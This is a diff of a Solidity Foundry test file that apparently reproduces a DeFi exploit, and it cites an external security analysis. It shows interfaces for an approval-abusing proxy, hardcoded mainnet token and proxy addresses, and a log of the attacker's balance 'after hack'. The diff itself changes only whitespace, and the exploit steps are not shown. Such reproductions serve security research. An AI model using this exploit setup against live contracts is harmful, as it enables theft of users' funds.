@@ -13,16 +13,21 @@ import "./../interface.sol";
 // @Analysis : https://twitter.com/numencyber/status/1669278694744150016?cxt=HHwWgMDS9Z2IvKouAAAA
 
 interface IProxy {
+
     function approveToken(address token, address pool, uint256 amount) external;
+
 }
 
 interface IToken {
+
     function balanceOf(address who) external view returns (uint256);
 
     function transferFrom(address sender, address recipient, uint256 amount) external;
+
 }
 
 contract ContractTest is Test {
+
     IToken DEPUSDT = IToken(0xdAC17F958D2ee523a2206206994597C13D831ec7);
     IToken LEVUSDC = IToken(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     IProxy ProxyDEPUSDT = IProxy(0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f);
@@ -53,4 +58,5 @@ contract ContractTest is Test {
 
         emit log_named_decimal_uint("Attacker LEVUSDC balance after hack", LEVUSDC.balanceOf(address(this)), 6);
     }
+
 }
